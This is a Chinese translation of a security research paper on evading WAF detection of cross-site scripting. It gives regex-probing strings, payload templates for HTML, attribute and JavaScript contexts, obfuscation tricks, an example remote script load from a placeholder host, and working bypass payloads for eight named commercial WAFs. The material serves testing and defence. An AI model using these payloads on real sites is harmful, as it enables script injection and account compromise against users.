> 原文链接: https://www.anquanke.com//post/id/173701 


# 绕过WAF的XSS检测机制


                                阅读量   
                                **391954**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者s0md3v，文章来源：github.com
                                <br>原文地址：[https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01ea0aac676dfe57d9.jpg)](https://p0.ssl.qhimg.com/t01ea0aac676dfe57d9.jpg)



## 前言

本文提出了一种定义明确的方法来绕过跨站点脚本（XSS）安全机制，通过发送探针并编写payload用于检测恶意字符串的规则。拟议的方法包括三个阶段：确定payload结构，测试和混淆。

为给定上下文确定各种payload结构提供了最佳测试方法,下一阶段涉及针对目标安全机制测试各种字符串。分析目标响应情况以便做出假设。

最后，必要时可以将payload进行混淆或其他调整。



## 介绍

跨站点脚本（XSS）是最常见的Web应用程序漏洞之一。通过清理用户输入，基于上下文转义输出，正确使用文档对象模型（DOM）接收器和源，实施适当的跨域资源共享（CORS）策略和其他安全策略，可以完全阻止它。尽管这些防御技术是公共知识，但Web应用程序防火墙（WAF）或自定义过滤器被广泛用于添加另一层安全性，以保护Web应用程序免受人为错误或新攻击媒介引入的漏洞的利用。虽然WAF供应商仍在尝试机器学习，但正则表达式仍然是最常用的检测恶意字符串的方法。本文提出了一种构建XSS payload的方法，该payload与这种安全机制使用的正则表达式不匹配。



## HTML CONTEXT

当用户输入被显示在网页的HTML代码中时，它被称为在HTML上下文中。 HTML上下文可以进一步根据显示位置划分为内标签和外标签。
<li>
**内标签**–`&lt;input type="text" value="$input"&gt;`
</li>
<li>
**外标签**–`&lt;span&gt;You entered $input&lt;/span&gt;`
</li>
### <a class="reference-link" name="%E5%A4%96%E6%A0%87%E7%AD%BE"></a>外标签

此上下文的`&lt;`负责启动HTML标签。根据HTML规范，标签名称必须以字母开头。利用此规范，可以使用以下探针来确定用于匹配标签名称的正则表达式：
<li>
`&lt;svg` – 如果通过，则不进行任何标签检查</li>
<li>
`&lt;dev` – 如果失败，`&lt;[a-z]+`
</li>
<li>
`x&lt;dev` – 如果通过，`^&lt;[a-z]+`
</li>
<li>
`&lt;dEv` – 如果失败， `&lt;[a-zA-Z]+`
</li>
<li>
`&lt;d3V` – 如果失败， `&lt;[a-zA-Z0-9]+`
</li>
<li>
`&lt;d|3v` – 如果失败， `&lt;.+`
</li>
如果安全机制不允许这些探针，则不能绕过它。由于误报率高，这种严格的规则不被鼓励去使用。<br>
如果上述的任何一个探针未被禁止，则有许多编写payload的方案。

<a class="reference-link" name="Payload%E6%96%B9%E6%A1%88#1"></a>**Payload方案#1**

`&lt;`{`tag`}``{`filler`}``{`event_handler`}``{`?filler`}`=`{`?filler`}``{`javascript`}``{`?filler`}``{`&gt;,//,Space,Tab,LF`}``

找到适当的``{`tag`}``值后，下一步是猜测用于匹配标签和事件处理程序之间填充符部分的正则表达式。此操作可以通过以下探针执行：
<li>
`&lt;tag xxx` – 如果失败，``{`space`}``
</li>
<li>
`&lt;tag%09xxx` – 如果失败，`[s]`
</li>
<li>
`&lt;tag%09%09xxx` -如果失败， `s+`
</li>
<li>
`&lt;tag/xxx` – 如果失败，`[s/]+`
</li>
<li>
`&lt;tag%0axxx`-如果失败， `[sn]+`
</li>
<li>
`&lt;tag%0dxxx&gt;`-如果失败， `[snr+]+`
</li>
<li>
`&lt;tag/~/xxx` – 如果失败， `.*+`
</li>
事件处理程序是payload结构中最重要的部分之一。它通常与种类的一般正则表达式`onw+`或黑名单相匹配，例如`on(load|click|error|show)`。第一个正则表达式非常严格且不可能被绕过，然而有些不太知名的事件处理程序可能不在黑名单中，经常可以被绕过。因此可以通过两个简单的检查来识别所使用的类型。
<li>
`&lt;tag`{`filler`}`onxxx` – 如果失败，`onw+`.</li>
<li>
<ul>
<li>如果通过， `on(load|click|error|show)`
</li>
如果正则的结果是`onw+`，则不能绕过它，因为所有事件处理程序都以on开始。在这种情况下，应该继续下一个payload。如果正则表达式遵循黑名单方法，则需要查找未列入黑名单的事件处理程序。如果所有事件处理程序都列入黑名单，则应继续执行下一个payload。

根据我对WAF的经验，我发现一些事件处理程序没有在黑名单中：

```
onauxclick
ondblclick
oncontextmenu
onmouseleave
ontouchcancel
```

下一个要执行的组件是JavaScript代码。它是payload的活动部分，但是匹配它不需要假设正则表达式，因为JavaScript代码是活动的，因此无法通过预定义模式进行匹配。

此时，payload的所有组件都放在一起，只需要关闭payload，通过以下方式完成：
- `&lt;payload&gt;`
- `&lt;payload`
- `&lt;payload`{`space`}``
- `&lt;payload//`
- `&lt;payload%0a`
- `&lt;payload%0d`
- `&lt;payload%09`
应该注意的是，HTML规范允许`&lt;tag`{`white space`}``{`anything here`}`&gt;`这表明例如：<br>`&lt;a href='http://example.com' ny text can be placed here as long as there's a greater-than sign somewhere later in the HTML document&gt;`<br>
是有效的HTML标签。因此，HTML标签的此属性使攻击者可以通过上述方式注入标签。

<a class="reference-link" name="Payload%E6%96%B9%E6%A1%88#2"></a>**Payload方案#2**

`&lt;sCriPt`{`filler`}`sRc`{`?filler`}`=`{`?filler`}``{`url`}``{`?filler`}``{`&gt;,//,Space,Tab,LF`}``

测试填充符（例如结束字符串）类似先前的payload方案。必须注意的是，`?`可以在URL的末尾使用（如果在URL之后没有使用填充符），而不是结束标记。每个经过`?`的字符都将被视为URL的一部分，直到遇到`&gt;`。通过使用`&lt;script&gt;`标记，很可能会被大多数安全规则检测到。

标签`&lt;object&gt;`的payload可以用类似的payload方案编写：

`&lt;obJecT`{`filler`}`data`{`?filler`}`=`{`?filler`}``{`url`}``{`?filler`}``{`&gt;,//,Space,Tab,LF`}``

<a class="reference-link" name="Payload%E6%96%B9%E6%A1%88#3"></a>**Payload方案#3**

这个payload方案有两种变体：plain和obfuscatable。

plain变体通常与诸如`href[s]`{`0,`}`=[s]`{`0,`}`javascript:`模式相匹配。其结构如下：

`&lt;A`{`filler`}`hReF`{`?filler`}`=`{`?filler`}`JavaScript:`{`javascript`}``{`?filler`}``{`&gt;,//,Space,Tab,LF`}``

obfuscatable payload变体有如下结构：

`&lt;A`{`filler`}`hReF`{`?filler`}`=`{`?filler`}``{`quote`}``{`special`}`:`{`javascript`}``{`quote`}``{`?filler`}``{`&gt;,//,Space,Tab,LF`}``

这两个变体之间的显著差异是``{`special`}``组件和``{`quote`}``s。``{`special`}``指字符串`javascript`的混淆版本，这可以使用换行符和水平制表符来混淆，如下所示：
- `j%0aAv%0dasCr%09ipt:`
- `J%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0aT%0a:`
- `J%0aa%0dv%09a%0as%0dc%09r%0ai%0dp%09T%0d%0a:`
在某些情况下，数字字符编码也可用于绕过检测。可以使用十进制和十六进制。
- `Javascript&amp;colon;`
- `javascript:`
显然有必要时两种混淆技术可以一起使用。
- `Java%0a%0d%09script&amp;colon;`
<a class="reference-link" name="%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%92%8C%E4%B8%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87"></a>**可执行和不可执行上下文**

根据注入的payload是否可以在没有任何特殊帮助的情况下执行，外标签上下文可以进一步分为**可执行**和**不可执行**上下文。当用户输入显示在HTML注释中时，`&lt;--$input--&gt;`或者在以下标记之间，会发生不可执行的上下文：

```
&lt;style&gt;
&lt;title&gt;
&lt;noembed&gt;
&lt;template&gt;
&lt;noscript&gt;
&lt;textarea&gt;

```

为了执行payload，必须关闭这些标签。因此测试可执行和非可执行上下文之间的唯一区别是`{`closing tag`}`组件的测试，可以按如下方式进行：
- `&lt;/tag&gt;`
- `&lt;/tAg/x&gt;`
- `&lt;/tag`{`space`}`&gt;`
- `&lt;/tag//&gt;`
- `&lt;/tag%0a&gt;`
- `&lt;/tag%0d&gt;`
- `&lt;/tag%09&gt;`
一旦发现有效的结束标签方案，``{`closing tag`}``{`any payload from executable payload section`}`` 就可以用于成功注入。

### <a class="reference-link" name="%E5%86%85%E9%83%A8%E6%A0%87%E7%AD%BE"></a>内部标签

<a class="reference-link" name="%E5%9C%A8%E5%B1%9E%E6%80%A7%E5%80%BC%E5%86%85/%E4%BD%9C%E4%B8%BA%E5%B1%9E%E6%80%A7%E5%80%BC"></a>**在属性值内/作为属性值**

此上下文的主字符是用于包含属性值的引号。例如，如果输入被显示为`&lt;input value="$input" type="text"&gt;`那么主字符应该是`"`。然而在某些情况下，主字符不需要突破上下文。

<a class="reference-link" name="%E5%9C%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F%E5%86%85%E9%83%A8"></a>**在事件处理程序内部**

如果输入显示在与事件处理程序关联的值中，例如，`&lt;tag event_handler="function($input)";`触发事件处理程序将执行该值中存在的JavaScript。

<a class="reference-link" name="%E5%9C%A8src%E5%B1%9E%E6%80%A7%E9%87%8C%E9%9D%A2"></a>**在src属性里面**

如果输入被显示为`src`脚本或iframe标记的属性值，例如`&lt;script src="$input"&gt;`，可以直接加载恶意脚本（在脚本标记的情况下）或网页（在iframe标记的情况下）如下：<br>`&lt;script src="http://example.com/malicious.js"&gt;`

绕过URL匹配正则表达式：
<li>
`//example.com/xss.js` 绕过 `http(?s)://`
</li>
<li>
`////////example.com/xss.js` 绕过`(?:http(?s):?)?//`
</li>
<li>
`////\/example.com/xss.js` 绕过 `(?:http(?s):?)?//+`
</li>
<a class="reference-link" name="%E5%9C%A8srcdoc%E5%B1%9E%E6%80%A7%E9%87%8C%E9%9D%A2"></a>**在srcdoc属性里面**

如果输入被显示为`srcdoc`iframe标签的属性值，例如`&lt;iframe srcdoc="$input"&gt;`，可以提供一个转义（使用HTML实体）HTML文档作为payload，如下所示：

`&lt;iframe srcdoc="&amp;lt;svg/onload=alert()&amp;gt;"&gt;`

<a class="reference-link" name="%E9%80%9A%E7%94%A8%E5%B1%9E%E6%80%A7"></a>**通用属性**

上述所有情况都不需要任何旁路技术，除了最后一个可以使用HTML上下文部分中使用的技术绕过。讨论的案例并不常见，最常见的类型如下：

`&lt;input type="text" value=""/onfocus="alert()$input"&gt;`

基于相关标签的交互性，它可以进而分为两类。

<a class="reference-link" name="%E5%8F%AF%E4%BA%A4%E4%BA%92%E7%9A%84"></a>**可交互的**

当输入显示在可以与例如点击，悬停，聚焦等交互的标签内时，突破上下文只需要引用一句话。在这种情况下的payload方案是：

``{`quote`}``{`filler`}``{`event_handler`}``{`?filler`}`=`{`?filler`}``{`javascript`}``

可以使用以下探针完成检查是否被WAF阻止：

`x"y`

事件处理程序在这里起着重要作用，因为它是WAF可以检测到的唯一组件。每个标签都支持一些事件处理程序，并且由用户来查找这样的情况，但是有一些事件处理程序可以绑定到下面列出的任何标签：

```
onclick
onauxclick
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
```

测试其余组件可以使用前面已经讨论过的方法。

<a class="reference-link" name="%E9%9A%BE%E6%8E%A7%E5%88%B6%E7%9A%84"></a>**难控制的**

当输入显示在无法与之交互的标签内时，需要使用标签本身来执行payload。这种情况的payload方案是：

``{`quote`}`&gt;`{`any payload scheme from html context section`}``



## JavaScript上下文

<a class="reference-link" name="%E4%BD%9C%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E9%87%8F"></a>**作为字符串变量**

JavaScript上下文最常见的类型是字符串变量中的反射。这是因为开发人员通常将用户输入分配给变量而非直接使用它们。<br>`var name = '$input';`

<a class="reference-link" name="Payload%E6%96%B9%E6%A1%88#1"></a>**Payload方案#1**

``{`quote`}``{`delimiter`}``{`javascript`}``{`delimiter`}``{`quote`}``

分隔符通常是JavaScipt运算符，诸如`^`。例如，如果用户输入落在单个带引号的字符串变量中，则payload可能是：

```
'^`{`javascript`}`^'
'*`{`javascript`}`*'
'+`{`javascript`}`+'
'/`{`javascript`}`/'
'%`{`javascript`}`%'
'|`{`javascript`}`|'
'&lt;`{`javascript`}`&lt;'
'&gt;`{`javascript`}`&gt;'
```

<a class="reference-link" name="Payload%E6%96%B9%E6%A1%88#2"></a>**Payload方案#2**

`{`quote`}``{`delimiter`}``{`javascript`}`//

它与之前的payload方案类似，只是它使用单行注释来注释掉行中的其余代码以保持语法有效。可以使用的payload是：

```
'&lt;`{`javascript`}`//'
'|`{`javascript`}`//'
'^`{`javascript`}`//'
```

<a class="reference-link" name="%E5%9C%A8%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%AD"></a>**在代码块中**

输入经常被显示到代码块中。例如，如果用户已付费订阅且超过18岁，则网页会执行某些操作。具有反射输入的JavaScript代码如下所示：

```
function example(age, subscription)`{`
    if (subscription)`{`
        if (age &gt; 18)`{`
            another_function('$input');
        `}`
    else`{`
        console.log('Requirements not met.');
    `}`
`}`
```

假设我们没有为订阅付费。为了解决这个问题，我们需要绕过`if (subscription)`块，这可以通过关闭条件块，函数调用等来完成。如果用户输入是`');`}``}`alert();if(true)`{`('`，它将显示如下：

```
function example(age, subscription)`{`
    if (subscription)`{`
        if (age &gt; 18)`{`
            another_function('');`}``}`alert();if(true)`{`('');
        `}`
    else`{`
        console.log('Requirements not met.');
    `}`
`}`
```

这里有个缩进视图用于了解payload的工作原理：

<code>function example(age, subscription)`{`<br>
if (subscription)`{`<br>
if (age &gt; 18)`{`<br>
another_function('');<br>
`}`<br>
`}`<br>
alert();<br>
if (true)`{`<br>
('');<br>
`}`<br>
else`{`<br>
console.log('Requirements not met.');<br>
`}`<br>
`}`</code>

`);`关闭当前的函数调用。<br>
第一个``}``关闭`if (age &gt; 18)`块。<br>
第二个``}``关闭`if subscription`块。<br>`alert();`用作测试的虚拟函数。<br>`if(true)`{``启动一个`if`条件块以保持代码在语法上有效，因为代码后面有一个else块。<br>
最后，`('`结合我们最初注入的函数调用的剩余部分。

它是您在wild遇到的最简单的代码块之一。为了简化打破代码块的过程，建议使用语法高亮**显示器，**例如**Sublime Text**。

payload的结构取决于代码本身，这种不确定性使得检测非常困难。但如果有需要，可以对代码进行混淆处理。例如，上面代码块的payload可以写成：

`');%0a`}`%0d`}`%09alert();/*anything here*/if(true)`{`//anything here%0a('`

如果输入显示到JavaScript代码中，无论它是在代码块还是变量字符串中，`&lt;/scRipT`{`?filler`}`&gt;`{`html context payload`}``都可以用于突破上下文并执行payload。这个payload方案应该在其他所有方面之前尝试，因为它很简单但也可能被检测到。



## 当前绕过WAF方案

在研究期间，共绕过了8个WAF。我对这些供应商进行了披露，因此一些（或所有）旁路可能因此被修补。以下是绕过的WAF名称，payload和旁路技术列表：

**名称：** Cloudflare<br>**payload：** `&lt;a"/onclick=(confirm)()&gt;click`<br>**旁路技术：**非空白填充

**名称：** Wordfence<br>**Payload：** `&lt;a/href=javascript&amp;colon;alert()&gt;click`<br>**旁路技术：**数字字符编码

**名称：** Barracuda<br>**Payload：** `&lt;a/href=Java%0a%0d%09script&amp;colon;alert()&gt;click`<br>**旁路技术：**数字字符编码

**名称：** Akamai<br>**payload：** `&lt;d3v/onauxclick=[2].some(confirm)&gt;click`<br>**旁路技术：**黑名单中缺少事件处理程序和函数调用混淆

**名称：** Comodo<br>**Payload：** `&lt;d3v/onauxclick=(((confirm)))``&gt;click`<br>**旁路技术：**黑名单中缺少事件处理程序和函数调用混淆

**名称：** F5<br>**payload：** `&lt;d3v/onmouseleave=[2].some(confirm)&gt;click`<br>**旁路技术：**黑名单中缺少事件处理程序和函数调用混淆

**名称：** ModSecurity<br>**payload：** `&lt;details/open/ontoggle=alert()&gt;`<br>**旁路技术：**黑名单中缺少标签（或事件处理程序）

**名称：** dotdefender<br>**payload：** `&lt;details/open/ontoggle=(confirm)()//`<br>**旁路技术：**黑名单中缺少标签或函数调用混淆以及可替换的结束标签



## 参考
- [HTML specification](https://www.w3.org/TR/html52/)
- [Numeric character reference](https://en.wikipedia.org/wiki/Numeric_character_reference)